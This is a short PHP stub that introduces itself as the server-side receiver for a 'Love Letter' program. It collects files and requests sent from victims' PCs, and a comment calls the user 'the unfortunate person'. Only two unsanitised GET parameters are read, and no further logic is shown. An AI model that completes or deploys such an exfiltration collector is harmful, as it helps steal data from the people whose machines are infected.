<?php
/*
    TellMe.php - handles all file uploads, get and post request
    from the Love Letter and puts them in place on your server.

    Tested on PHP 5 and can work on later versions, all you 
    have to do is copypaste this on your server's public directory.
*/

// The unfortunate person's username on their PC.
$username = $_GET["username"];
// The type of file to upload.
$uploadtype = $_GET["type"];


?>